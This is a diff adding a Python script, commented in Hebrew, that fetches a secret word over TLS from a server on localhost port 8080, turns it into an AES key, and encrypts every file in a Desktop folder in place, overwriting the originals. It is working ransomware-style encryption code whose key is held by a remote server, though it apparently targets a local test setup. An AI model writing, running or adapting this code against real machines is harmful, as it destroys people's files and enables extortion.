@@ -1,0 +1,71 @@
+import socket
+import ssl
+import os
+from Crypto.Cipher import AES
+from Crypto.Hash import SHA256
+from Crypto.Util.Padding import pad
+
+# פונקציה ליצירת מפתח AES ממילת הסוד
+def create_aes_key(secret):
+    hash_obj = SHA256.new(secret.encode('utf-8'))
+    return hash_obj.digest()
+
+
+
+# הצפנת קובץ באמצעות AES
+def encrypt_file(filepath, key):
+    with open(filepath, 'rb') as f:
+        file_data = f.read()
+
+    cipher = AES.new(key, AES.MODE_CBC)
+    cipher_data = cipher.encrypt(pad(file_data, AES.block_size))
+
+    with open(filepath, 'wb') as f:
+        f.write(cipher.iv)  # שמירת ה-IV בתחילת הקובץ
+        f.write(cipher_data)
+
+    print(f"Encrypted: {filepath}")
+
+# התחברות לשרת וקבלת מילת הסוד
+def start_client(folder):
+    host = '127.0.0.1'
+    port = 8080
+
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.settimeout(10)
+
+    # יצירת קונטקסט SSL
+    context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
+    context.check_hostname = False
+    context.verify_mode = ssl.CERT_REQUIRED  # שים לב כאן
+
+    # טוען את התעודה של השרת
+    context.load_verify_locations('C:/Users/Owner/Desktop/server-cert.pem')  #   כאן זה התעודה חשוב עדכן כאן עם הנתיב המתאים
+
+    # עטיפת הסוקט ב-SSL
+    ssl_socket = context.wrap_socket(sock, server_hostname=host)
+
+    # התחברות לשרת
+    print(f"Connecting to {host}:{port}")
+    ssl_socket.connect((host, port))
+    print("Connected successfully.")
+
+    # קבלת מילת הסוד מהשרת
+    secret = ssl_socket.recv(1024).decode('utf-8')
+    print(f"Received secret: {secret}")
+    
+
+    # יצירת מפתח AES ממילת הסוד
+    key = create_aes_key(secret)
+
+    # הצפנת כל הקבצים בתיקייה
+    for filename in os.listdir(folder):
+        filepath = os.path.join(folder, filename)
+        if os.path.isfile(filepath):
+            encrypt_file(filepath, key)
+
+    ssl_socket.close()
+    print("Connection closed.")
+
+# הפעלת הלקוח
+start_client('C:\\Users\\Owner\\Desktop\\SECERT')
